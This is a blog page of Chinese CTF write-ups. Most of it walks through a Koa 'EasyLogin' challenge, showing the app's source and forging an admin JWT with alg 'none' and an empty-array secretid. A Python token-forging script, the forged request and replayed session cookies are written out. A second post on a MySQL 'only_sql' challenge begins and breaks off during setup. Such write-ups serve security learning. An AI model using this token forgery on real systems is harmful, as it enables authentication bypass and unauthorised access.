class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们猜测网页获取flag的方式和内部的app.js有关</p><h3 id="访问app-js"><a href="#访问app-js" class="headerlink" title="访问app.js:"></a>访问app.js:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  或许该用 koa-static 来处理静态文件</span><br><span class="hljs-comment"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> token = <span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, &#123; username, password, <span class="hljs-attr">authorization</span>: token &#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123; status &#125; = data;<br>            <span class="hljs-keyword">if</span> (status) &#123;<br>                <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/home&quot;</span>;<br>            &#125;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">register</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>    <span class="hljs-keyword">const</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123; username, password &#125;)<br>        .<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>            <span class="hljs-keyword">const</span> &#123; token &#125; = data;<br>            <span class="hljs-variable language_">sessionStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;token&#x27;</span>, token);<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/login&quot;</span>;<br>        &#125;)<br>        .<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>        &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/logout&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123; status &#125; = data;<br>        <span class="hljs-keyword">if</span> (status) &#123;<br>            <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;/login&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getflag</span>(<span class="hljs-params"></span>) &#123;<br>    $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/flag&#x27;</span>).<span class="hljs-title function_">done</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>        <span class="hljs-keyword">const</span> &#123; flag &#125; = data;<br>        $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>(flag);<br>    &#125;).<span class="hljs-title function_">fail</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">xhr, textStatus, errorThrown</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseJSON</span>.<span class="hljs-property">message</span>);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>有一个getflag()函数，该函数应该就是用来获取flag</p><h3 id="访问-api-flag"><a href="#访问-api-flag" class="headerlink" title="访问&#x2F;api&#x2F;flag:"></a>访问&#x2F;api&#x2F;flag:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129153839638.png" alt="image-20240129153839638"></p><p>发现我们没有权限访问该文件，同时通过抓包我们观察到cookie的身份验证采用了jwt加密</p><h3 id="返回观察app-js"><a href="#返回观察app-js" class="headerlink" title="返回观察app.js:"></a>返回观察app.js:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129154031289.png" alt="image-20240129154031289"></p><p>可以根据出题人的提示得到网页采用koa框架</p><h3 id="koa框架"><a href="#koa框架" class="headerlink" title="koa框架:"></a>koa框架:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129155006493.png" alt="image-20240129155006493"></p><h3 id="获取koa的控制器controllers的源码"><a href="#获取koa的控制器controllers的源码" class="headerlink" title="获取koa的控制器controllers的源码:"></a>获取koa的控制器controllers的源码:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">/controllers/api.js<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">APIError</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).<span class="hljs-property">APIError</span>;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-title function_">async</span>(ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123; username, password &#125; = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>;<br>        <span class="hljs-comment">// username不能是admin和空</span><br>        <span class="hljs-keyword">if</span> (!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 判断全局存储的密钥集个数是否超过100000</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-comment">// 密钥集中的密钥个数超过100000将密钥集赋空</span><br>            <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span> = [];<br>        &#125;<br>        <span class="hljs-comment">// 随机产生一个密钥secret</span><br>        <span class="hljs-keyword">const</span> secret = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-comment">// 获取当前密钥集中的密钥个数，作为当前产生的密钥的索引index</span><br>        <span class="hljs-keyword">const</span> secretid = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span>;<br>        <span class="hljs-comment">// 将当前用户的密钥存入密钥集中</span><br>        <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-title function_">push</span>(secret)<br>            <span class="hljs-comment">// 使用username,password以及密钥进行jwt加密</span><br>        <span class="hljs-keyword">const</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; secretid, username, password &#125;, secret, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-title function_">async</span>(ctx, next) =&gt; &#123;<br>        <span class="hljs-comment">// 获取请求体中的内容，即获取login中的用户输入的username和password的值</span><br>        <span class="hljs-keyword">const</span> &#123; username, password &#125; = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>;<br>        <span class="hljs-comment">// 判断用户的输入是否为空</span><br>        <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 获取令牌信息</span><br>        <span class="hljs-keyword">const</span> token = ctx.<span class="hljs-property">header</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>.<span class="hljs-property">authorization</span> || ctx.<span class="hljs-property">request</span>.<span class="hljs-property">query</span>.<span class="hljs-property">authorization</span>;<br><br>        <span class="hljs-keyword">const</span> sid = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(token.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>()).<span class="hljs-property">secretid</span>;<br>        <span class="hljs-comment">// 输出在编译器中，但不输出在网页端上</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sid)<br><br>        <span class="hljs-keyword">if</span> (sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 获取全局变量中的当前用户的secret值</span><br>        <span class="hljs-keyword">const</span> secret = <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>[sid];<br>        <span class="hljs-comment">// 使用token,secret,进行jwt解密，赋值给user,token通过jwt解密后返回原来的用户信息</span><br>        <span class="hljs-comment">// 如果token本身加密为alg=none,则不进行HS256解密，直接返回普通解密后的结果</span><br>        <span class="hljs-keyword">const</span> user = jwt.<span class="hljs-title function_">verify</span>(token, secret, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br>        <span class="hljs-comment">// 获取user的登录信息是否正确，返回true和false给status</span><br>        <span class="hljs-keyword">const</span> status = username === user.<span class="hljs-property">username</span> &amp;&amp; password === user.<span class="hljs-property">password</span>;<br><br>        <span class="hljs-keyword">if</span> (status) &#123;<br>            <span class="hljs-comment">// 对ctx.session.username的值赋值</span><br>            ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = username;<br>        &#125;<br><br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            status<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br>    <span class="hljs-comment">// 以get请求方式访问flag文件的获取</span><br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-title function_">async</span>(ctx, next) =&gt; &#123;<br>        <span class="hljs-comment">// 判断session中的username的值是否为admin</span><br>        <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br>        <span class="hljs-comment">// 如果是admin则返回flag的信息</span><br>        <span class="hljs-keyword">const</span> flag = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            flag<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-title function_">async</span>(ctx, next) =&gt; &#123;<br>        ctx.<span class="hljs-property">session</span>.<span class="hljs-property">username</span> = <span class="hljs-literal">null</span>;<br>        ctx.<span class="hljs-title function_">rest</span>(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="审计分析"><a href="#审计分析" class="headerlink" title="审计分析:"></a>审计分析:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">通过代码审计，我们发现要想获取到flag，需要满足的条件只有我们的username=admin即可，即我们只需要伪造我们是admin用户登录就可以访问获取flag<br><br>同时通过代码审计身份验证token获取的authorization是存在于ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization，即登录数据包中的heard请求头，或者请求体中，所以我们需要抓取登录的数据包，才能进行伪造身份登录。<br></code></pre></td></tr></table></figure><h3 id="重新抓取登录的数据包"><a href="#重新抓取登录的数据包" class="headerlink" title="重新抓取登录的数据包:"></a>重新抓取登录的数据包:</h3><p><img src="/images/2023-2-3-EasyLogin/image-20240129162208872.png" alt="image-20240129162208872"></p><h4 id="获取到数据"><a href="#获取到数据" class="headerlink" title="获取到数据:"></a>获取到数据:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=south<br>&amp;password=123<br>&amp;authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJzb3V0aCIsInBhc3N3b3JkIjoiMTIzIiwiaWF0IjoxNzA2NTE2NTA1fQ.Rot2Vt8Tw4CPk5GgXzVvdIdUOsaKwpr2bNuAxDhGU38<br></code></pre></td></tr></table></figure><h3 id="对authorization进行jwt解密-使用jwt解密在线工具"><a href="#对authorization进行jwt解密-使用jwt解密在线工具" class="headerlink" title="对authorization进行jwt解密(使用jwt解密在线工具):"></a>对authorization进行jwt解密(使用jwt解密在线工具):</h3><p><a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p><img src="/images/2023-2-3-EasyLogin/image-20240129162531956.png" alt="image-20240129162531956"></p><p>由于我们不知道secret密钥值，所以无法用网站直接生成我们伪造的jwt加密字符串</p><h3 id="secretid绕过方式"><a href="#secretid绕过方式" class="headerlink" title="secretid绕过方式:"></a>secretid绕过方式:</h3><p>绕过一下代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-variable language_">global</span>.<span class="hljs-property">secrets</span>.<span class="hljs-property">length</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>test.js:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sid = [];<br><span class="hljs-comment">// 输出在编译器中，但不输出在网页端上</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sid)<br>    <span class="hljs-comment">// 判断密钥的索引是否合法</span><br><span class="hljs-keyword">if</span> (sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-number">1</span> &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;win&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// 判断密钥的索引是否合法</span><br><span class="hljs-keyword">if</span> (sid === <span class="hljs-literal">undefined</span> || sid === <span class="hljs-literal">null</span> || !(sid == <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;win2&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2023-2-3-EasyLogin/image-20240129175512442.png" alt="image-20240129175512442"></p><h3 id="JWT支持将算法设定为“None”。如果“alg”字段设为“-None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问："><a href="#JWT支持将算法设定为“None”。如果“alg”字段设为“-None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问：" class="headerlink" title="JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问："></a>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么JWT的第三部分会被置空，这样任何token都是有效的。这样就可以伪造token进行随意访问：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;<br>  &quot;alg&quot;: &quot;none&quot;,<br>  &quot;typ&quot;: &quot;JWT&quot;<br>&#125;<br><br>&#123;<br>  &quot;secretid&quot;: [],<br>  &quot;username&quot;: &quot;admin&quot;,<br>  &quot;password&quot;: &quot;123&quot;,<br>  &quot;iat&quot;: 1706516505<br>&#125;<br></code></pre></td></tr></table></figure><p>由于我们把加密算法设置成了”alg”: “none”,jwt的第三部分也就没有意义了</p><p><strong>经过测试必须通过”secretid”: [],进行绕过，不然所产生的jwt密文就无法成功被验证为admin</strong></p><h3 id="获取jwt加密的python脚本"><a href="#获取jwt加密的python脚本" class="headerlink" title="获取jwt加密的python脚本:"></a>获取jwt加密的python脚本:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> jwt<br>token = jwt.encode(<br>&#123;<br>  <span class="hljs-string">&quot;secretid&quot;</span>: [],<br>  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1706516505</span><br>&#125;,<br>algorithm=<span class="hljs-string">&quot;none&quot;</span>,key=<span class="hljs-string">&quot;&quot;</span>).encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br> <br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2023-2-3-EasyLogin/image-20240129172918428.png" alt="image-20240129172918428"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTcwNjUxNjUwNX0.<br></code></pre></td></tr></table></figure><h3 id="上传我们的token-同时伪造身份为admin："><a href="#上传我们的token-同时伪造身份为admin：" class="headerlink" title="上传我们的token,同时伪造身份为admin："></a>上传我们的token,同时伪造身份为admin：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>&amp;password=123<br>&amp;authorization=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTcwNjUxNjUwNX0.<br></code></pre></td></tr></table></figure><p><img src="/images/2023-2-3-EasyLogin/image-20240129173334414.png" alt="image-20240129173334414"></p><p>成功伪造admin登录！！！</p><h3 id="在响应数据包中获得admin登录cookie"><a href="#在响应数据包中获得admin登录cookie" class="headerlink" title="在响应数据包中获得admin登录cookie:"></a>在响应数据包中获得admin登录cookie:</h3><p>网页验证你的身份是通过cookie来进行验证的，所以我们访问api&#x2F;flag时，也要伪造cookie</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Set-Cookie: sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTcwNjYwNzMxODU2MSwiX21heEFnZSI6ODY0MDAwMDB9; path=/; expires=Tue, 30 Jan 2024 09:35:18 GMT; httponly<br>Set-Cookie: sses:aok.sig=1xDhQnp68lq8IRqsQiuMWI0LwCA; path=/; expires=Tue, 30 Jan 2024 09:35:18 GMT; httponly<br>Cache-Control: no-cache<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie=sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTcwNjYwNzMxODU2MSwiX21heEFnZSI6ODY0MDAwMDB9;sses:aok.sig=1xDhQnp68lq8IRqsQiuMWI0LwCA;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-2-3-EasyLogin/image-20240129173704271.png" alt="image-20240129173704271"></p><p>获得flag信息:<br>flag&#x3D;flag{0f2c699c-e88e-4fb2-a122-19087f707cb5}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第七届西湖论剑复现—only_sql-WP</title>
    <link href="/2024/02/03/2024-2-3-only_sql/"/>
    <url>/2024/02/03/2024-2-3-only_sql/</url>
    
    <content type="html"><![CDATA[<h1 id="第七届西湖论剑复现—only-sql"><a href="#第七届西湖论剑复现—only-sql" class="headerlink" title="第七届西湖论剑复现—only_sql"></a>第七届西湖论剑复现—only_sql</h1><h2 id="By-south整理"><a href="#By-south整理" class="headerlink" title="By-south整理"></a>By-south整理</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p><a href="https://mp.weixin.qq.com/s/-3yim0oUpSoyp8jP_2dnwA">https://mp.weixin.qq.com/s/-3yim0oUpSoyp8jP_2dnwA</a></p><p><a href="https://zhuanlan.zhihu.com/p/675466196">linux环境下的MySQL UDF提权 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/q20010619/article/details/121438371">第三方组件提权-Mysql UDF提权_udf提权和mysql版本有什么关系-CSDN博客</a></p><h2 id="环境的搭建"><a href="#环境的搭建" class="headerlink" title="环境的搭建:"></a>环境的搭建:</h2><p>访问我的题目环境:<br><img src="/images/2024-2-3-only_sql/image-20240202143718334.png" alt="image-20240202143718334"></p><p>题目的要求就是先让我们连接一个数据库，这个数据库可以是任意的数据库，只要我们能够知道数据库的地址，用户名，密码，要连接的数据库名就可以，由于我们本身不知道，题目的数据库地址以及其他信息，所以我们现在只能连接自己已知道的数据库，比如我们的本地数据库，连接成功以后就可以对我们的数据库进行一切的操作（数据库支持的操作合法语句），即为我们提供了一个mysql的服务端，但由于本人比较菜，所以只写了一个简易的操作端口，用一个表单传递我们的数据库操作语句，在连接时直接进行操作。</p><p><img src="/images/2024-2-3-only_sql/image-20240202143602563.png" alt="image-20240202143602563"></p><p>我在我的本地数据库中创建了一张test表用于对环境的测试，现在我使用我的数据库信息，以及sql语句进行对环境的测试。</p><h2 id="环境测试"><a 